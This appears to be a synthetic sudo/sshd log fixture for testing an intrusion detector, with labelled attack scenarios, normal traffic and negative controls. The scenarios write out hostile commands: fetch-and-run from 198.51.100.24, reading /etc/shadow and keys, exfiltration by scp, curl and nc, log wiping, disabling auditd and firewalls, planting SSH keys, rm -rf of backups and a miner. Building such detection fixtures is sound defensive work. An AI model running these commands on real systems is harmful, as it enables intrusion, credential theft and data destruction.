Dec 21 10:00:01 webserver sudo[8401]: alice : 1 incorrect password attempt ; TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
Dec 21 10:00:10 webserver sudo[8402]: pam_unix(sudo:auth): authentication failure; logname=alice uid=1005 euid=0 tty=/dev/pts/2 ruser=alice rhost= user=alice
Dec 21 10:00:10 webserver sudo[8402]: alice : 1 incorrect password attempt ; TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
Dec 21 10:00:20 webserver sudo[8403]: pam_unix(sudo:auth): authentication failure; logname=alice uid=1005 euid=0 tty=/dev/pts/2 ruser=alice rhost= user=alice
Dec 21 10:00:20 webserver sudo[8403]: alice : 1 incorrect password attempt ; TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
Dec 21 10:00:35 webserver sudo[8404]: alice : TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
Dec 21 10:00:35 webserver sudo[8404]: pam_unix(sudo:session): session opened for user root by alice(uid=1005)

# === ATTACK SCENARIO 9: SUID and Linux Capability Abuse (Dec 21 10:30) ===
# Attacker creates alternative privilege-escalation paths
Dec 21 10:30:00 webserver sudo[8500]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /bin/bash /tmp/.sysbash
Dec 21 10:30:05 webserver sudo[8501]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chown root:root /tmp/.sysbash
Dec 21 10:30:10 webserver sudo[8502]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 4755 /tmp/.sysbash
Dec 21 10:30:20 webserver sudo[8503]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/setcap cap_setuid+ep /usr/bin/python3
Dec 21 10:30:30 webserver sudo[8504]: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/getcap /usr/bin/python3

# === ATTACK SCENARIO 10: Sudoers Modification (Dec 21 11:00) ===
# Persistent passwordless sudo is granted to a compromised user
Dec 21 11:00:00 webserver sudo[8600]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cp /etc/sudoers /tmp/sudoers.bak
Dec 21 11:00:05 webserver sudo[8601]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "alice ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
Dec 21 11:00:10 webserver sudo[8602]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/visudo -c

# === NORMAL ADMIN TRAFFIC ===
Dec 21 11:30:01 webserver CRON[8700]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 21 11:30:01 webserver CRON[8700]: pam_unix(cron:session): session closed for user root
Dec 21 11:40:00 webserver sudo[8710]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx --since today

# === ATTACK SCENARIO 11: SSH Authorized-Key Persistence (Dec 21 12:00) ===
# Attacker plants a new public key for persistent access
Dec 21 12:00:00 webserver sudo[8800]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/mkdir -p /root/.ssh
Dec 21 12:00:05 webserver sudo[8801]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 700 /root/.ssh
Dec 21 12:00:10 webserver sudo[8802]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCattackkey redteam@lab" >> /root/.ssh/authorized_keys'
Dec 21 12:00:15 webserver sudo[8803]: alice : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys
Dec 21 12:05:00 webserver sshd[8810]: Accepted publickey for root from 198.51.100.24 port 53110 ssh2
Dec 21 12:05:00 webserver sshd[8810]: pam_unix(sshd:session): session opened for user root by (uid=0)

# === ATTACK SCENARIO 12: Systemd Service Persistence (Dec 21 12:30) ===
# Malicious service is created and enabled
Dec 21 12:30:00 webserver sudo[8900]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "[Unit]" > /etc/systemd/system/update-agent.service'
Dec 21 12:30:05 webserver sudo[8901]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "[Service]" >> /etc/systemd/system/update-agent.service'
Dec 21 12:30:10 webserver sudo[8902]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ExecStart=/tmp/.update-agent" >> /etc/systemd/system/update-agent.service'
Dec 21 12:30:15 webserver sudo[8903]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "[Install]" >> /etc/systemd/system/update-agent.service'
Dec 21 12:30:20 webserver sudo[8904]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "WantedBy=multi-user.target" >> /etc/systemd/system/update-agent.service'
Dec 21 12:30:30 webserver sudo[8905]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl daemon-reload
Dec 21 12:30:35 webserver sudo[8906]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl enable update-agent.service
Dec 21 12:30:40 webserver sudo[8907]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl start update-agent.service

# === ATTACK SCENARIO 13: Shell-Profile Persistence (Dec 21 13:00) ===
# Login shell startup files are modified
Dec 21 13:00:00 webserver sudo[9000]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "/tmp/.update-agent >/dev/null 2>&1 &" >> /root/.bashrc'
Dec 21 13:00:10 webserver sudo[9001]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "bash /tmp/.profile-update &" >> /home/deploy/.profile'
Dec 21 13:00:20 webserver sudo[9002]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/chown deploy:deploy /home/deploy/.profile

# === ATTACK SCENARIO 14: Encoded Download-and-Execute (Dec 21 13:30) ===
# Encoded command and remote script execution patterns
Dec 21 13:30:00 webserver sudo[9100]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo Y3VybCBodHRwOi8vMTk4LjUxLjEwMC4yNC9hLnNoIC1vIC90bXAvYS5zaA== | base64 -d > /tmp/.cmd'
Dec 21 13:30:05 webserver sudo[9101]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/.cmd
Dec 21 13:30:10 webserver sudo[9102]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl -fsSL http://198.51.100.24/install.sh | bash'
Dec 21 13:30:20 webserver sudo[9103]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'wget -q http://198.51.100.24/agent -O /dev/shm/.agent && chmod +x /dev/shm/.agent && /dev/shm/.agent'

# === ATTACK SCENARIO 15: Interpreter Abuse from Temporary Directories (Dec 21 14:00) ===
# Multiple interpreters launch code from writable temporary locations
Dec 21 14:00:00 webserver sudo[9200]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 /tmp/.cache/update.py
Dec 21 14:00:10 webserver sudo[9201]: root : TTY=pts/3 ; PWD=/var/tmp ; USER=root ; COMMAND=/usr/bin/perl /var/tmp/.sync.pl
Dec 21 14:00:20 webserver sudo[9202]: root : TTY=pts/3 ; PWD=/dev/shm ; USER=root ; COMMAND=/bin/bash /dev/shm/.run.sh
Dec 21 14:00:30 webserver sudo[9203]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ruby /tmp/.worker.rb

# === NORMAL TRAFFIC ===
Dec 21 14:30:01 webserver CRON[9300]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 21 14:30:01 webserver CRON[9300]: pam_unix(cron:session): session closed for user root
Dec 21 14:40:00 webserver sshd[9310]: Accepted publickey for admin from 10.0.0.10 port 53220 ssh2
Dec 21 14:45:00 webserver sudo[9315]: admin : TTY=pts/4 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get update
Dec 21 14:50:00 webserver sshd[9310]: pam_unix(sshd:session): session closed for user admin

# === ATTACK SCENARIO 16: Credential and Secret Discovery (Dec 21 15:00) ===
# Attacker searches common credential locations
Dec 21 15:00:00 webserver sudo[9400]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Dec 21 15:00:05 webserver sudo[9401]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /root/.ssh/id_rsa
Dec 21 15:00:10 webserver sudo[9402]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /home/deploy/.ssh/id_rsa
Dec 21 15:00:15 webserver sudo[9403]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /root/.aws/credentials
Dec 21 15:00:20 webserver sudo[9404]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find /home -name .env -o -name credentials -o -name id_rsa
Dec 21 15:00:25 webserver sudo[9405]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/grep -R 'password=' /var/www /home 2>/dev/null

# === ATTACK SCENARIO 17: Host and Network Discovery (Dec 21 15:30) ===
# Post-compromise reconnaissance of processes, sockets, routes, users, and services
Dec 21 15:30:00 webserver sudo[9500]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ps aux
Dec 21 15:30:05 webserver sudo[9501]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ss -tulpn
Dec 21 15:30:10 webserver sudo[9502]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/ip addr show
Dec 21 15:30:15 webserver sudo[9503]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/ip route show
Dec 21 15:30:20 webserver sudo[9504]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/w
Dec 21 15:30:25 webserver sudo[9505]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/last -n 20
Dec 21 15:30:30 webserver sudo[9506]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl list-units --type=service
Dec 21 15:30:35 webserver sudo[9507]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f
Dec 21 15:30:40 webserver sudo[9508]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sudo -l

# === ATTACK SCENARIO 18: Collection and Multi-Channel Exfiltration (Dec 21 16:00) ===
# Sensitive data is staged and transferred using several common tools
Dec 21 16:00:00 webserver sudo[9600]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/tar czf /tmp/.stage.tgz /etc/passwd /etc/shadow /root/.ssh /root/.aws
Dec 21 16:00:10 webserver sudo[9601]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/.stage.tgz exfil@198.51.100.24:/tmp/server-data.tgz
Dec 21 16:00:20 webserver sudo[9602]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -X POST -F file=@/tmp/.stage.tgz http://198.51.100.24/upload
Dec 21 16:00:30 webserver sudo[9603]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'nc 198.51.100.24 9001 < /tmp/.stage.tgz'

# === ATTACK SCENARIO 19: Shell-History and Log Tampering (Dec 21 16:30) ===
# Evidence is removed after collection and exfiltration
Dec 21 16:30:00 webserver sudo[9700]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c
Dec 21 16:30:05 webserver sudo[9701]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/rm -f /root/.bash_history
Dec 21 16:30:10 webserver sudo[9702]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log
Dec 21 16:30:15 webserver sudo[9703]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/shred -u /var/log/nginx/access.log
Dec 21 16:30:20 webserver sudo[9704]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s

# === ATTACK SCENARIO 20: Security-Control Disabling (Dec 21 17:00) ===
# Audit and firewall services are deliberately weakened
Dec 21 17:00:00 webserver sudo[9800]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd
Dec 21 17:00:05 webserver sudo[9801]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl disable auditd
Dec 21 17:00:10 webserver sudo[9802]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/ufw disable
Dec 21 17:00:15 webserver sudo[9803]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop fail2ban

# === ATTACK SCENARIO 21: Firewall Rule Manipulation (Dec 21 17:30) ===
# Network filtering is modified to open access and remove controls
Dec 21 17:30:00 webserver sudo[9900]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/iptables -F
Dec 21 17:30:05 webserver sudo[9901]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
Dec 21 17:30:10 webserver sudo[9902]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/nft flush ruleset
Dec 21 17:30:15 webserver sudo[9903]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/nft add rule inet filter input tcp dport 4444 accept

# === NORMAL TRAFFIC ===
Dec 21 18:00:01 webserver CRON[10000]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 21 18:00:01 webserver CRON[10000]: pam_unix(cron:session): session closed for user root
Dec 21 18:10:00 webserver sudo[10010]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/logrotate -f /etc/logrotate.d/nginx

# === ATTACK SCENARIO 22: Hidden Files and Timestamp Manipulation (Dec 21 18:30) ===
# Artifacts are hidden and timestamps altered to blend with older files
Dec 21 18:30:00 webserver sudo[10100]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/agent /tmp/.systemd-cache
Dec 21 18:30:05 webserver sudo[10101]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 700 /tmp/.systemd-cache
Dec 21 18:30:10 webserver sudo[10102]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/touch -t 202401010101 /tmp/.systemd-cache
Dec 21 18:30:15 webserver sudo[10103]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/touch -r /bin/ls /tmp/.systemd-cache

# === ATTACK SCENARIO 23: SSH Lateral Movement (Dec 21 19:00) ===
# Compromised host is used to access additional internal systems
Dec 21 19:00:00 webserver sudo[10200]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh -o StrictHostKeyChecking=no admin@10.0.0.20
Dec 21 19:00:15 webserver sudo[10201]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/.systemd-cache admin@10.0.0.20:/tmp/.cache
Dec 21 19:00:30 webserver sudo[10202]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh deploy@10.0.0.25 'whoami && hostname'
Dec 21 19:00:45 webserver sudo[10203]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh backup@10.0.0.30 'cat /etc/passwd'

# === ATTACK SCENARIO 24: Destructive Impact and Service Disruption (Dec 21 19:30) ===
# Services and application data are deliberately damaged
Dec 21 19:30:00 webserver sudo[10300]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop nginx
Dec 21 19:30:05 webserver sudo[10301]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop ssh
Dec 21 19:30:10 webserver sudo[10302]: root : TTY=pts/3 ; PWD=/var/www ; USER=root ; COMMAND=/bin/chmod -R 000 /var/www/html
Dec 21 19:30:15 webserver sudo[10303]: root : TTY=pts/3 ; PWD=/var/www ; USER=root ; COMMAND=/bin/rm -rf /var/www/html/uploads
Dec 21 19:30:20 webserver sudo[10304]: root : TTY=pts/3 ; PWD=/var/lib ; USER=root ; COMMAND=/bin/rm -rf /var/backups/app

# === ATTACK SCENARIO 25: Resource Hijacking / Miner-like Execution (Dec 21 20:00) ===
# Suspicious binary is downloaded, hidden, and executed as a long-running process
Dec 21 20:00:00 webserver sudo[10400]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.24/worker -o /tmp/.kworker
Dec 21 20:00:05 webserver sudo[10401]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/.kworker
Dec 21 20:00:10 webserver sudo[10402]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nohup /tmp/.kworker --pool 198.51.100.24:3333
Dec 21 20:00:15 webserver sudo[10403]: root : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nice -n 19 /tmp/.kworker --background
Dec 21 20:00:20 webserver sudo[10404]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "@reboot root /tmp/.kworker --background" >> /etc/crontab'
Dec 21 20:00:30 webserver sudo[10405]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ps aux
Dec 21 18:05:00 webserver sudo[10010]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status auditd
Dec 21 18:05:05 webserver sudo[10011]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl restart auditd
# === ATTACK SCENARIO 26: SSH Configuration Modification (Dec 21 20:00) ===
# Attacker weakens SSH authentication controls after obtaining sudo access

Dec 21 20:00:00 webserver sshd[11000]: Accepted password for alice from 198.51.100.24 port 55000 ssh2
Dec 21 20:00:00 webserver sshd[11000]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Dec 21 20:00:01 webserver systemd-logind[500]: New session 90 of user alice.

# Enable direct root SSH login
Dec 21 20:01:00 webserver sudo[11010]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# Enable SSH password authentication
Dec 21 20:01:10 webserver sudo[11011]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Allow empty passwords
Dec 21 20:01:20 webserver sudo[11012]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitEmptyPasswords no/PermitEmptyPasswords yes/' /etc/ssh/sshd_config

# Disable public-key authentication
Dec 21 20:01:30 webserver sudo[11013]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config

# Modify commented PermitRootLogin configuration
Dec 21 20:01:40 webserver sudo[11014]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/#PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# Modify SSH drop-in configuration
Dec 21 20:02:00 webserver sudo[11015]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config.d/99-custom.conf

# Another SSH drop-in modification
Dec 21 20:02:10 webserver sudo[11016]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config.d/backdoor.conf

# Disable public key authentication in drop-in configuration
Dec 21 20:02:20 webserver sudo[11017]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config.d/security.conf

# Reload SSH service after configuration changes
Dec 21 20:02:30 webserver sudo[11018]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl reload ssh

# Restart SSH daemon
Dec 21 20:02:40 webserver sudo[11019]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart sshd

# === NEGATIVE CONTROL TESTS ===
# These commands should NOT create ssh_config_modification findings

# Secure root login by changing yes to no
Dec 21 20:03:00 webserver sudo[11020]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# Disable password authentication
Dec 21 20:03:10 webserver sudo[11021]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# Disable empty passwords
Dec 21 20:03:20 webserver sudo[11022]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitEmptyPasswords yes/PermitEmptyPasswords no/' /etc/ssh/sshd_config

# Enable public key authentication
Dec 21 20:03:30 webserver sudo[11023]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Same dangerous-looking configuration but wrong target file
Dec 21 20:03:40 webserver sudo[11024]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /tmp/sshd_config

# Backup file should not trigger
Dec 21 20:03:50 webserver sudo[11025]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config.backup

# Completely unrelated sed command
Dec 21 20:04:00 webserver sudo[11026]: admin : TTY=pts/6 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/sed -i 's/listen 80/listen 8080/' /etc/nginx/nginx.conf

# Read SSH configuration only
Dec 21 20:04:10 webserver sudo[11027]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/ssh/sshd_config

# Check SSH configuration syntax
Dec 21 20:04:20 webserver sudo[11028]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/sshd -t

Dec 21 20:05:00 webserver sshd[11000]: pam_unix(sshd:session): session closed for user alice
# === SSH CONFIG MODIFICATION USING TEE ===

# Write directly to main SSH config
Dec 21 20:10:00 webserver sudo[11100]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config

# Append to main SSH config
Dec 21 20:10:10 webserver sudo[11101]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /etc/ssh/sshd_config

# Append using long option
Dec 21 20:10:20 webserver sudo[11102]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee --append /etc/ssh/sshd_config

# Write a drop-in configuration
Dec 21 20:10:30 webserver sudo[11103]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.d/99-backdoor.conf

# Append to another drop-in config
Dec 21 20:10:40 webserver sudo[11104]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/tee -a /etc/ssh/sshd_config.d/custom.conf

# Another SSH configuration file
Dec 21 20:10:50 webserver sudo[11105]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/tee --append /etc/ssh/sshd_config.d/security.conf


# === NEGATIVE CONTROL TESTS FOR TEE ===

# Unrelated file
Dec 21 20:11:00 webserver sudo[11110]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /tmp/test.conf

# nginx configuration
Dec 21 20:11:10 webserver sudo[11111]: admin : TTY=pts/6 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/tee -a /etc/nginx/nginx.conf

# SSH config backup file - should NOT trigger
Dec 21 20:11:20 webserver sudo[11112]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.backup

# Similar-looking file in /tmp - should NOT trigger
Dec 21 20:11:30 webserver sudo[11113]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /tmp/sshd_config

# Directory name looks similar but is not sshd_config.d
Dec 21 20:11:40 webserver sudo[11114]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.old/test.conf
# === SSH CONFIG MODIFICATION USING CP AND MV ===

# Copy file over main SSH config
Dec 21 20:20:00 webserver sudo[11200]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/sshd.conf /etc/ssh/sshd_config

# Copy file into sshd_config.d
Dec 21 20:20:10 webserver sudo[11201]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cp /tmp/backdoor.conf /etc/ssh/sshd_config.d/99-backdoor.conf

# Copy with force option
Dec 21 20:20:20 webserver sudo[11202]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp -f /tmp/custom.conf /etc/ssh/sshd_config.d/custom.conf

# Move file over main SSH config
Dec 21 20:20:30 webserver sudo[11203]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/sshd.new /etc/ssh/sshd_config

# Move file into sshd_config.d
Dec 21 20:20:40 webserver sudo[11204]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mv /tmp/persistence.conf /etc/ssh/sshd_config.d/persistence.conf

# Move with force option
Dec 21 20:20:50 webserver sudo[11205]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv -f /tmp/security.conf /etc/ssh/sshd_config.d/security.conf


# === NEGATIVE CONTROL TESTS FOR CP/MV ===

# Copy to unrelated location
Dec 21 20:21:00 webserver sudo[11210]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test.conf /tmp/sshd_config

# Copy to backup file - should NOT trigger
Dec 21 20:21:10 webserver sudo[11211]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/sshd.conf /etc/ssh/sshd_config.backup

# Move to unrelated location
Dec 21 20:21:20 webserver sudo[11212]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/test.conf /tmp/test2.conf

# Move to similarly named backup file
Dec 21 20:21:30 webserver sudo[11213]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/sshd.conf /etc/ssh/sshd_config.old
# === SSH AUTHORIZED_KEYS PERSISTENCE TESTS ===

# Add SSH public key using echo append
Dec 21 20:30:00 webserver sudo[11300]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtestkey attacker@lab" >> /root/.ssh/authorized_keys'

# Add ED25519 key
Dec 21 20:30:10 webserver sudo[11301]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKey attacker@lab" >> /home/alice/.ssh/authorized_keys'

# Overwrite authorized_keys
Dec 21 20:30:20 webserver sudo[11302]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-rsa AAAAB3NzaNewKey redteam@lab" > /root/.ssh/authorized_keys'

# Append using tee
Dec 21 20:30:30 webserver sudo[11303]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys

# Write using tee to another user's authorized_keys
Dec 21 20:30:40 webserver sudo[11304]: alice : TTY=pts/5 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /home/deploy/.ssh/authorized_keys

# Copy prepared key file into authorized_keys
Dec 21 20:30:50 webserver sudo[11305]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/authorized_keys.backdoor /root/.ssh/authorized_keys

# Copy key file into another user's account
Dec 21 20:31:00 webserver sudo[11306]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cp /tmp/deploy_keys /home/deploy/.ssh/authorized_keys

